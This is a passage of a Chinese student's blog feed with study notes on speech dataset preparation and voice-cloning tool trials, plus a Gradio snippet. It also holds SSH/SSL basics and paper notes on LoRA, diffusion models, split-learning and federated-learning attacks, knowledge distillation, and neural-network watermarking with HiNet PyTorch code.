class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">### luan.txt</span><br><span class="line">请进。</span><br><span class="line">坐。</span><br><span class="line">你自己看看这个视频。</span><br><span class="line">唐若遥，你是不是觉得自己很了不起？自己给对家送子弹？</span><br></pre></td></tr></table></figure><ul><li>最终的输出形式为人名命名的txt文件</li></ul><p><img src="/image-20230426144125829.png" alt="image-20230426144125829"></p><h2 id="语音转文字"><a href="#语音转文字" class="headerlink" title="语音转文字"></a>语音转文字</h2><p>所得翻译文本一行对应一个音频，对应音频按照数字递增+wav后缀即可</p><p>&#x2F;data&#x2F;project&#x2F;ASR 使用服务器yh下的该项目，之前把识别为空的wav没有加上空行</p><p>虽然实际上识别为空行的非常少,但是确实有一两句话是有空行的，主要是行号要和wav文件名对应</p><p>导致识别语句和实际音频会有错位</p><p>需要重写代码，加入空行语句</p><h2 id="语音-文本匹配"><a href="#语音-文本匹配" class="headerlink" title="语音-文本匹配"></a>语音-文本匹配</h2><ul><li><p>在匹配过程中，删除了一些空行。</p></li><li><p>字典1{“fanyi”，“翻译文件名称.wav”}</p></li><li><p>判定翻译与gt后，加入索引，索引能够对应同一个gt即可，获得字典2{ “fanyi”:”” , “pipe”: “”},按照“pipei”字段，最后汇总表格。获得gt(文字一行)-fanyi（音频文件名  多个）</p></li><li><p>字典1，字典2  字段合并</p></li></ul><p>单条文本可以对应多条语音</p><p>文本带有标点，但是使用无标点的文本  和  文本转文字   获得的文字进行匹配</p><p>只对能匹配的文本进行匹配</p><p>最终获得表格-包括语句-对应音频文件名多个</p><p>之后进行音频的合并</p><table><thead><tr><th>0</th><th>随便找个宾馆吧</th><th>随便找个宾馆吧，明天九点接我去公司,下午回家。</th><th>0.wav</th></tr></thead><tbody><tr><td>1</td><td>明天九点接我去公司下午回家</td><td>随便找个宾馆吧，明天九点接我去公司,下午回家。</td><td>1.wav</td></tr></tbody></table><ul><li>解决了空识别跳过导致的wav名称和内容不匹配的问题，可能只有一处是空识别</li><li>依据标点分割</li><li>分为两种情况</li><li>是子集，则直接放入语音识别的文本到字典</li><li>不是子集，但是有一定的相似度，则放gt文本到字典</li></ul><h1 id="语音fake生成"><a href="#语音fake生成" class="headerlink" title="语音fake生成"></a>语音fake生成</h1><p><a href="https://github.com/CorentinJ/Real-Time-Voice-Cloning/">https://github.com/CorentinJ/Real-Time-Voice-Cloning/</a></p><ul><li>中文无法使用，有</li><li>使用给定的英文音频可以使用</li></ul><p><a href="https://huggingface.co/spaces/Kevin676/ChatGPT-with-Voice-Cloning-for-All">https://huggingface.co/spaces/Kevin676/ChatGPT-with-Voice-Cloning-for-All</a>  </p><ul><li>不大行</li><li>作者建议使用女声进行voice clone，生成声音完全不像</li></ul><p><a href="https://github.com/vincentherrmann/pytorch-wavenet">https://github.com/vincentherrmann/pytorch-wavenet</a></p><ul><li>跑不起来，数据集搞不懂</li></ul><p><a href="https://github.com/PaddlePaddle/PaddleSpeech/wiki/PaddleSpeech-CLI-Architecture">https://github.com/PaddlePaddle/PaddleSpeech/wiki/PaddleSpeech-CLI-Architecture</a></p><p>paddle应该是可以用的</p><p><a href="https://www.bilibili.com/read/cv20153960">https://www.bilibili.com/read/cv20153960</a> <strong>MockingBird</strong></p><p>实际上是对Real-Time-Voice-Cloning使用了中文的预训练模型并开发了前端。</p><p>不大行。封装版本无法进行训练，作者建议使用女声进行测试</p><p>弄不好</p><p><a href="https://github.com/SayaSS/vits-finetuning">https://github.com/SayaSS/vits-finetuning</a></p><p>日语vit模型，python讲日语的库无法安装</p><p><a href="https://huggingface.co/spaces/innnky/trump/blob/main/app.py">https://huggingface.co/spaces/innnky/trump/blob/main/app.py</a></p><p>看出使用了transformer模块，可能使用的是vits</p><p>trump微调模型，中文也能跑，声音奇奇怪怪的但是还行。</p><p>使用英文转trump效果还行，比如使用希拉里转trump</p><p><a href="https://github.com/PlayVoice/vits_chinese">https://github.com/PlayVoice/vits_chinese</a></p><p>中文VITS，还没跑完，数据集搞不懂</p><p><a href="https://github.com/Plachtaa/VITS-fast-fine-tuning">https://github.com/Plachtaa/VITS-fast-fine-tuning</a></p><p>在colab上跑，fine tune训练有问题,可能是样本不足的问题。</p><p>colab用完了免费算力。</p><p>重新测试，使用大约12分钟的训练数据集，大概能看</p><ul><li>2023&#x2F;4&#x2F;25 感觉TTS(text to speech):200epoch的模型测试还行</li><li>可以使用vc（voice clone），但是需要转换前后都有声音模型，即需要已知音频之间的转换</li><li>重新使用大约30分钟的音频训练效果还行，有那个味道。</li></ul><p><strong>paddlespeech</strong> <a href="https://aistudio.baidu.com/aistudio/projectdetail/4573549?sUid=2470186&amp;shared=1&amp;ts=1663753541400">https://aistudio.baidu.com/aistudio/projectdetail/4573549?sUid=2470186&amp;shared=1&amp;ts=1663753541400</a></p><p><a href="https://aistudio.baidu.com/aistudio/projectdetail/6037057">https://aistudio.baidu.com/aistudio/projectdetail/6037057</a></p><p>paddle speech 以及对应项目</p><p>paddle speech使用一句话生成，使用男声数据可能不大行，使用女声感觉还可以。和预训练数据集有关</p><p><a href="https://github.com/jerryuhoo/VTuberTalk">https://github.com/jerryuhoo/VTuberTalk</a></p><p>基于paddlespeech的语音合成项目，音频-视频转数据集代码根本跑不起来</p><p><a href="https://github.com/svc-develop-team/so-vits-svc">https://github.com/svc-develop-team/so-vits-svc</a></p><p>唱歌so-vtis，和vits算法的 不同之处在于so-vits</p><table><thead><tr><th></th><th>vits</th><th>so-vits</th></tr></thead><tbody><tr><td></td><td>用于正常语音合成</td><td>singing voice conversion唱歌的</td></tr><tr><td></td><td>不支持未知语音2语音转换</td><td>支持未知语言2现有语音转换</td></tr><tr><td></td><td></td><td></td></tr></tbody></table><h1 id="AI部属库"><a href="#AI部属库" class="headerlink" title="AI部属库"></a>AI部属库</h1><ul><li>Gradio</li></ul><p>能够简单实现AI&#x2F;图像算法部署web，在localhost中部署</p><ul><li><p>就是把前后端的一些通用的东西集成了，只改变算法部分。</p></li><li><p>只要给出输出输出，数量和给定的算法函数对应就能跑</p><p>基本框架如下：使用前先加载模型，并设置对应函数</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">app = gr.Blocks()</span><br><span class="line"><span class="keyword">with</span> app:</span><br><span class="line">    <span class="keyword">with</span> gr.Tabs():</span><br><span class="line">        <span class="keyword">with</span> gr.TabItem(<span class="string">&quot;Basic&quot;</span>):</span><br><span class="line">            gr.Markdown(value=<span class="string">&quot;&quot;&quot;&quot;&quot;&quot;</span>)</span><br><span class="line">            vc_input3 = gr.Audio(label=<span class="string">&quot;上传音频（长度小于45秒）&quot;</span>)</span><br><span class="line">            vc_submit = gr.Button(<span class="string">&quot;转换&quot;</span>, variant=<span class="string">&quot;primary&quot;</span>)</span><br><span class="line">            vc_output1 = gr.Textbox(label=<span class="string">&quot;Output Message&quot;</span>)</span><br><span class="line">            vc_output2 = gr.Audio(label=<span class="string">&quot;Output Audio&quot;</span>)</span><br><span class="line">        vc_submit.click(vc_fn, [ vc_input3], [vc_output1, vc_output2])</span><br><span class="line"></span><br><span class="line">    app.launch()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> AI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AIGC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssh and ssl</title>
      <link href="/2023/04/18/ssh-and-ssl/"/>
      <url>/2023/04/18/ssh-and-ssl/</url>
      
        <content type="html"><![CDATA[<p>读<a href="https://juejin.cn/post/6998422276311908360%EF%BC%8C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0">https://juejin.cn/post/6998422276311908360，学习笔记</a></p><h1 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h1><p>全称为Security Shell，安全shell</p><p>用于远程登陆安全性</p><p>如xshell和github</p><p><img src="/ssh-and-ssl/image-20230418204402263.png" alt="image-20230418204402263"></p><h1 id="ssl"><a href="#ssl" class="headerlink" title="ssl"></a>ssl</h1><p>全套接层（Secure Sockets Layer）</p><p>没听说过</p><p>SSL协议会在数据传输之前对数据进行<strong>加密</strong>再进行<strong>网络传输</strong>，保证了用户数据在传输链路上的安全。</p><p>① 保密：在握手协议中定义了会话密钥后，所有的消息都被加密；</p><p>② 鉴别：可选的客户端认证，和强制的服务器端认证；</p><p>③ 完整性：传送的消息包括消息完整性检查（使用MAC）</p><blockquote><p>SSL协议包含两个子协议：</p><ul><li>记录协议(SSL Record Protocol)：说明SSL的数据包应该如何封装的。位于OSI七层模型的会话层上，为不同机器上的用户建立和管理会话。</li><li>握手协议(SSL Handshake Protocol)：说明通信双方如何协商共同决定使用什么算法以及算法使用的key。它在OSI七层模型会话层的下一层——表示层上，对他们之间的网络联接进行加密解密。</li></ul><p>作者：月光也会跟着我<br>链接：<a href="https://juejin.cn/post/6998422276311908360">https://juejin.cn/post/6998422276311908360</a><br>来源：稀土掘金<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p></blockquote><h1 id="https"><a href="#https" class="headerlink" title="https"></a>https</h1><blockquote><p><strong>HTTPS &#x3D; HTTP + SSL&#x2F;TLS</strong></p></blockquote><h1 id="数字证书"><a href="#数字证书" class="headerlink" title="数字证书"></a>数字证书</h1>]]></content>
      
      
      <categories>
          
          <category> AI，信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全，本科生 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>readpapers in shixi</title>
      <link href="/2023/04/06/read-papers-in-shixi/"/>
      <url>/2023/04/06/read-papers-in-shixi/</url>
      
        <content type="html"><![CDATA[<h1 id="lora"><a href="#lora" class="headerlink" title="lora"></a>lora</h1><p>解决了如今语音识别等模型过大，需要频繁进行fine tune的问题</p><ul><li>原本设计用于语音模型的微调</li><li>它冻结了预训练的模型权重，并将可训练的秩分解矩阵注入到<strong>Transformer架构的每一层</strong>，大大减少了下游任务的可训练参数的数量</li><li><a href="https://github.com/microsoft/LoRA">https://github.com/microsoft/LoRA</a></li><li><a href="https://zhuanlan.zhihu.com/p/612992813">https://zhuanlan.zhihu.com/p/612992813</a>  stable diffusers各模型优化方法解读</li></ul><h2 id="主要相关方法"><a href="#主要相关方法" class="headerlink" title="主要相关方法"></a>主要相关方法</h2><p>看出了一些端倪</p><p>AIGC任务分为两个网络：text_embedding模块和Diffusion Model,会有一些模型将这两个模块分别加载。但是在webui中，为合并加载，应当使用只在stable diffusion模块中加入影响的Lora模型进行训练。</p><h3 id="dreambooth"><a href="#dreambooth" class="headerlink" title="dreambooth"></a>dreambooth</h3><ul><li>直接在原本大模型后插入SKS小网络优化，微调参数。</li></ul><p><img src="https://pic2.zhimg.com/80/v2-991e6410b7c386b8b14864e12c982335_720w.webp" alt="img"></p><h3 id="lora-1"><a href="#lora-1" class="headerlink" title="lora"></a>lora</h3><ul><li><p>注意，只是在text_embedding后加入一个小模块</p></li><li><p>在基础模型sd的transformer层之间插入秩分解矩阵，固定原本基础模型的参数。</p></li><li><p>好处在于可以得到一个较小的lora微调模型。无论是传播还是使用都方便</p></li><li><p><a href="https://civitai.com/">https://civitai.com/</a>  lora模型站</p></li></ul><p><img src="https://pic2.zhimg.com/80/v2-8e7e27d7a8b5514e756395bf0e8efde9_720w.webp" alt="img"></p><h3 id="Hypernetwork"><a href="#Hypernetwork" class="headerlink" title="Hypernetwork"></a>Hypernetwork</h3><ul><li>基本原理和lora相同，输出模型为全部的模型，即transformer块间加入微调层的大模型</li></ul><h2 id="lora-2"><a href="#lora-2" class="headerlink" title="lora"></a>lora</h2><p>提出LoRA，一种有效的自适应策略，既没有引入推理延迟，也没有减少输入序列长度，同时保持高模型质量。重要的是，当作为服务部署时，通过共享绝大多数模型参数，它允许快速任务切换。虽然我们关注的是Transformer语言模型，但所提出的原则通常适用于任何具有密集层的神经网络。</p><h1 id="High-Resolution-Image-Synthesis-with-Latent-Diffusion-Models"><a href="#High-Resolution-Image-Synthesis-with-Latent-Diffusion-Models" class="headerlink" title="High-Resolution Image Synthesis with Latent Diffusion Models"></a><strong>High-Resolution Image Synthesis with Latent Diffusion Models</strong></h1><ul><li><p>作者：Ludwig Maximilian University of Munich &amp; IWR，慕尼黑大学</p></li><li><p><a href="https://github.com/CompVis/latent-diffusion">https://github.com/CompVis/latent-diffusion</a></p></li></ul><p>我们的潜在扩散模型(ldm)在图像修补和类条件图像合成方面取得了新的最先进的分数，并在各种任务上获得了极具竞争力的性能，包括文本到图像合成，无条件图像生成和超分辨率，同时与基于像素的DMs相比，大大降低了计算需求。</p><h1 id="PCAT-Functionality-and-Data-Stealing-from-Split-Learning-by-Pseudo-Client-Attack"><a href="#PCAT-Functionality-and-Data-Stealing-from-Split-Learning-by-Pseudo-Client-Attack" class="headerlink" title="PCAT: Functionality and Data Stealing from Split Learning by Pseudo-Client Attack"></a><strong>PCAT: Functionality and Data Stealing from Split Learning by Pseudo-Client Attack</strong></h1><ul><li><p>一种split learning攻击方法</p></li><li><p>现有方法需要白盒攻击，并只对浅层网络有效</p></li><li><p>思路在于生成一个类客户机模型，窃取客户机的功能</p></li></ul><h2 id="创新"><a href="#创新" class="headerlink" title="创新"></a>创新</h2><ul><li>可用于split learn 的各种结构</li><li>不需要得到网络结构</li><li>攻击对于服务器是透明的，行为与正常相同</li><li>只需要少量的原始数据</li></ul><h2 id="split-learning"><a href="#split-learning" class="headerlink" title="split learning"></a>split learning</h2><p><img src="/magicer-under-paper/image-20230322151413218.png" alt="image-20230322151413218"></p><ul><li>split learning：多个常规算力节点(Alices)+一个超级算力节点(Bob)。核心思想是各方在不泄露原始数据的情况下，共同训练一个完整的模型，同时将模型中计算负载较高的部分安排在Bob节点。对Split Learning的介绍一般是基于分布式计算架构SplitNN进行展开。</li><li>联邦学习：分布式计算，多方提供部分数据集，地位相同</li></ul><p>看不懂这个</p><h1 id="联邦学习-（federated-learning-algorithm）"><a href="#联邦学习-（federated-learning-algorithm）" class="headerlink" title="联邦学习 （federated learning algorithm）"></a>联邦学习 （federated learning algorithm）</h1><ul><li>服务器是诚实但好奇的。</li><li>攻击形式：成员推理攻击、模型反演&#x2F;数据重构攻击和属性推理攻击。可以攻击获得训练图像和模型权重</li><li>可以使用梯度模糊，加入高斯噪声等方法防御攻击，梯度压缩[61]，差分私有训练[62]，和表示扰动[66]。</li></ul><h1 id="knowledge-distillation（知识蒸馏）"><a href="#knowledge-distillation（知识蒸馏）" class="headerlink" title="knowledge distillation（知识蒸馏）"></a>knowledge distillation（知识蒸馏）</h1><p><a href="https://zhuanlan.zhihu.com/p/102038521">https://zhuanlan.zhihu.com/p/102038521</a></p><ul><li><p>模型压缩方法，是一种基于“教师-学生网络思想”的训练方法。</p></li><li><p>KD:就是将已经训练好的模型包含的知识(”Knowledge”)，蒸馏(“Distill”)提取到另一个模型里面去。</p></li><li><p>可以用于模型的轻量化，类似的还有模型剪枝</p></li></ul><blockquote><p>模型就像一个容器，训练数据中蕴含的知识就像是要装进容器里的水。当数据知识量(水量)超过模型所能建模的范围时(容器的容积)，加再多的数据也不能提升效果(水再多也装不进容器)，因为模型的表达空间有限(容器容积有限)，就会造成<strong>underfitting</strong>；而当模型的参数量大于已有知识所需要的表达空间时(容积大于水量，水装不满容器)，就会造成<strong>overfitting</strong>，即模型的variance会增大(想象一下摇晃半满的容器，里面水的形状是不稳定的)。</p></blockquote><p>但是可以通过合理的训练方法获取更多的知识。</p><blockquote><p>知识蒸馏使用的是Teacher—Student模型，其中teacher是“知识”的输出者，student是“知识”的接受者。知识蒸馏的过程分为2个阶段:</p><ol><li>原始模型训练: 训练”Teacher模型”,  简称为Net-T，它的特点是模型相对复杂，也可以由多个分别训练的模型集成而成。我们对”Teacher模型”不作任何关于模型架构、参数量、是否集成方面的限制，唯一的要求就是，对于输入X, 其都能输出Y，其中Y经过softmax的映射，输出值对应相应类别的概率值。</li><li>精简模型训练: 训练”Student模型”, 简称为Net-S，它是参数量较小、模型结构相对简单的单模型。同样的，对于输入X，其都能输出Y，Y经过softmax映射后同样能输出对应相应类别的概率值。</li></ol></blockquote><h2 id="关键点"><a href="#关键点" class="headerlink" title="关键点"></a>关键点</h2><ul><li><strong>机器学习最根本的目的</strong>在于训练出在某个问题上泛化能力强的模型。</li></ul><ul><li><strong>泛化能力强</strong>: 在某问题的所有数据上都能很好地反应输入和输出之间的关系，无论是训练数据，还是测试数据，还是任何属于该问题的未知数据。</li><li>负标签也包含了信息，和网络的泛化性能有关</li></ul><p><img src="https://pic2.zhimg.com/80/v2-d01f5142d06aa27bc5e207831b5131d9_720w.webp" alt="img"></p><p><img src="https://pic4.zhimg.com/80/v2-a9e90626c5ac6f64a7e04c89f6ce3013_720w.webp" alt="img"></p><ul><li><p><strong>温度的高低改变的是Net-S训练过程中对负标签的关注程度</strong>: 温度较低时，对负标签的关注，尤其是那些显著低于平均值的负标签的关注较少；而温度较高时，负标签相关的值会相对增大，Net-S会相对多地关注到负标签。</p></li><li><p>矛盾点在于</p><blockquote><p>从有部分信息量的负标签中学习 –&gt; 温度要高一些</p><p>防止受负标签中噪声的影响 –&gt;温度要低一些</p></blockquote></li></ul><h2 id="训练"><a href="#训练" class="headerlink" title="训练"></a>训练</h2><p><strong>第一步</strong>是训练Net-T；<strong>第二步</strong>是在高温T下，蒸馏Net-T的知识到Net-S；推理过程使用T&#x3D;1.</p><h1 id="剪枝"><a href="#剪枝" class="headerlink" title="剪枝"></a>剪枝</h1><ul><li>删除不重要的权重，比如y&#x3D;x+2*x^2 ，可以去除x的权重</li><li>深度学习模型中一般存在大量的冗余参数，模型剪枝即删除不重要的权重，可以缩减模型大小，提高模型计算效率。剪枝算法可以分为以下三个步骤：训练模型、模型剪枝、重新训练，并迭代以上三个步骤，直到模型精度达到目标。根据剪枝颗粒的不同，模型剪枝方法可以分为细粒度剪枝、向量剪枝、卷积核剪枝、滤波器剪枝。</li></ul><h1 id="神经网络水印"><a href="#神经网络水印" class="headerlink" title="神经网络水印"></a>神经网络水印</h1><p>证明网络权重的产权问题</p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><ul><li>基于内在机制的白盒神经网络水印</li><li>基于触发集的黑盒神经网络水印</li><li>基于输出结果的无盒神经网络水印</li></ul><h2 id="白盒（待修"><a href="#白盒（待修" class="headerlink" title="白盒（待修"></a>白盒（待修</h2><p>修改网络权重，加入一个符合正态分布的全连接层，在这个全连接层中加入秘密信息（不明）</p><h2 id="黑盒（待修"><a href="#黑盒（待修" class="headerlink" title="黑盒（待修"></a>黑盒（待修</h2><p>基于触发集，对于特定一系列图像有特定的输出，有点像对抗样本</p><ul><li>问题在于只能在分类任务中使用</li></ul><h2 id="无盒"><a href="#无盒" class="headerlink" title="无盒"></a>无盒</h2><blockquote><p>Watermarking Neural Networks with Watermarked Images</p><p> DOI 10.1109&#x2F;TCSVT.2020.3030671</p><p>复日大学</p><p>Hanzhou Wu, <em>Member, IEEE</em>, Gen Liu, Yuwei Yao and Xinpeng Zhang</p></blockquote><p>基于输出图像，效果和“完成输出之后，将图像输入一个带密钥的水印网络相似”</p><p>区别在于</p><table><thead><tr><th>无盒水印</th><th>后加水印</th></tr></thead><tbody><tr><td>遗失的权重还具有水印</td><td>遗失无效</td></tr></tbody></table><p><img src="/read-papers-in-shixi/image-20230327142820987.png" alt="image-20230327142820987"></p><p>感觉这个鲁棒性的问题很大，可能噪声鲁棒性是网络训练完就自带的，但是剪切的鲁棒性没有加入noise layer不大可能有。</p><h1 id="模型所有权技术"><a href="#模型所有权技术" class="headerlink" title="模型所有权技术"></a>模型所有权技术</h1><ul><li><p>Fingerprint：hash&#x2F;md5</p></li><li><p>模型相似度:Copy, Right? A Testing Framework for Copyright</p><p>Protection of Deep Learning Models</p></li></ul><h1 id="可逆神经网络INN-watermark"><a href="#可逆神经网络INN-watermark" class="headerlink" title="可逆神经网络INN-watermark"></a>可逆神经网络INN-watermark</h1><p>Invertible Neural Networks, INN</p><p>图像质量指标：PSNR(dB)，SSIM ,MAE，RMSE</p><blockquote><p><strong>HiNet: Deep Image Hiding by Invertible Network</strong></p><p>beihang unversity</p><p> github:<a href="https://github.com/TomTomTommi/HiNet">https://github.com/TomTomTommi/HiNet</a></p><p>数据集：<em>ImageNet, COCO and DIV2K datasets.</em></p></blockquote><p>可逆神经网络，编解码部分使用相同的参数，可以减少模型大小</p><p>水印问题，编解码可以视为可逆问题。</p><p><img src="/read-papers-in-shixi/image-20230327143907338.png" alt="image-20230327143907338"></p><p><img src="/read-papers-in-shixi/image-20230327144123731.png" alt="image-20230327144123731"></p><p><img src="https://img-blog.csdnimg.cn/adaeca37cdf241debc14bb3d21fec57d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUGhvZW5peHRyZWVfRG9uZ1poYW8=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p><h2 id="DWT-IWT"><a href="#DWT-IWT" class="headerlink" title="DWT,IWT"></a>DWT,IWT</h2><p>离散小波变换，具有可逆性，逆小波变换。制造原始图像的高频分量，隐写域在图像的高频分量中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">DWT</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(DWT, self).__init__()</span><br><span class="line">        self.requires_grad = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        <span class="keyword">return</span> dwt_init(x)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dwt_init</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="comment"># dwt 离散小波变换，获取4个分量</span></span><br><span class="line">    x01 = x[:, :, <span class="number">0</span>::<span class="number">2</span>, :] / <span class="number">2</span></span><br><span class="line">    x02 = x[:, :, <span class="number">1</span>::<span class="number">2</span>, :] / <span class="number">2</span></span><br><span class="line">    x1 = x01[:, :, :, <span class="number">0</span>::<span class="number">2</span>]</span><br><span class="line">    x2 = x02[:, :, :, <span class="number">0</span>::<span class="number">2</span>]</span><br><span class="line">    x3 = x01[:, :, :, <span class="number">1</span>::<span class="number">2</span>]</span><br><span class="line">    x4 = x02[:, :, :, <span class="number">1</span>::<span class="number">2</span>]</span><br><span class="line">    x_LL = x1 + x2 + x3 + x4</span><br><span class="line">    x_HL = -x1 - x2 + x3 + x4</span><br><span class="line">    x_LH = -x1 + x2 - x3 + x4</span><br><span class="line">    x_HH = x1 - x2 - x3 + x4</span><br><span class="line">    <span class="keyword">return</span> torch.cat((x_LL, x_HL, x_LH, x_HH), <span class="number">1</span>) <span class="comment"># 堆叠4个分量 (:,12,:,:)</span></span><br></pre></td></tr></table></figure><h2 id="INN代码实现"><a href="#INN代码实现" class="headerlink" title="INN代码实现"></a>INN代码实现</h2><h3 id="主网络"><a href="#主网络" class="headerlink" title="主网络"></a>主网络</h3><p>主要特点为编解码可逆</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x, rev=<span class="literal">False</span></span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> rev:</span><br><span class="line">        out = self.inv1(x)</span><br><span class="line">        out = self.inv2(out)</span><br><span class="line">        out = self.inv3(out)</span><br><span class="line">        out = self.inv4(out)</span><br><span class="line">        out = self.inv5(out)</span><br><span class="line">        out = self.inv6(out)</span><br><span class="line">        out = self.inv7(out)</span><br><span class="line">        out = self.inv8(out)</span><br><span class="line"></span><br><span class="line">        out = self.inv9(out)</span><br><span class="line">        out = self.inv10(out)</span><br><span class="line">        out = self.inv11(out)</span><br><span class="line">        out = self.inv12(out)</span><br><span class="line">        out = self.inv13(out)</span><br><span class="line">        out = self.inv14(out)</span><br><span class="line">        out = self.inv15(out)</span><br><span class="line">        out = self.inv16(out)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        out = self.inv16(x, rev=<span class="literal">True</span>)</span><br><span class="line">        out = self.inv15(out, rev=<span class="literal">True</span>)</span><br><span class="line">        out = self.inv14(out, rev=<span class="literal">True</span>)</span><br><span class="line">        out = self.inv13(out, rev=<span class="literal">True</span>)</span><br><span class="line">        out = self.inv12(out, rev=<span class="literal">True</span>)</span><br><span class="line">        out = self.inv11(out, rev=<span class="literal">True</span>)</span><br><span class="line">        out = self.inv10(out, rev=<span class="literal">True</span>)</span><br><span class="line">        out = self.inv9(out, rev=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">        out = self.inv8(out, rev=<span class="literal">True</span>)</span><br><span class="line">        out = self.inv7(out, rev=<span class="literal">True</span>)</span><br><span class="line">        out = self.inv6(out, rev=<span class="literal">True</span>)</span><br><span class="line">        out = self.inv5(out, rev=<span class="literal">True</span>)</span><br><span class="line">        out = self.inv4(out, rev=<span class="literal">True</span>)</span><br><span class="line">        out = self.inv3(out, rev=<span class="literal">True</span>)</span><br><span class="line">        out = self.inv2(out, rev=<span class="literal">True</span>)</span><br><span class="line">        out = self.inv1(out, rev=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> out</span><br></pre></td></tr></table></figure><h3 id="INV-block"><a href="#INV-block" class="headerlink" title="INV_block"></a>INV_block</h3><p>φ ρ η网络是相同的残差块，参数不共享</p><p>在解码网络中，直接设置rev&#x3D;true</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">INV_block</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, subnet_constructor=ResidualDenseBlock_out, clamp=c.clamp, harr=<span class="literal">True</span>, in_1=<span class="number">3</span>, in_2=<span class="number">3</span></span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        <span class="keyword">if</span> harr:</span><br><span class="line">            self.split_len1 = in_1 * <span class="number">4</span></span><br><span class="line">            self.split_len2 = in_2 * <span class="number">4</span></span><br><span class="line">        self.clamp = clamp</span><br><span class="line">        <span class="comment"># ρ</span></span><br><span class="line">        self.r = subnet_constructor(self.split_len1, self.split_len2)</span><br><span class="line">        <span class="comment"># η</span></span><br><span class="line">        self.y = subnet_constructor(self.split_len1, self.split_len2)</span><br><span class="line">        <span class="comment"># φ</span></span><br><span class="line">        self.f = subnet_constructor(self.split_len2, self.split_len1)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">e</span>(<span class="params">self, s</span>):</span><br><span class="line">        <span class="keyword">return</span> torch.exp(self.clamp * <span class="number">2</span> * (torch.sigmoid(s) - <span class="number">0.5</span>))  <span class="comment">#e^ (clamp* 2 *  1/(1+e^(-x)) -0.5)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x, rev=<span class="literal">False</span></span>):</span><br><span class="line">        x1, x2 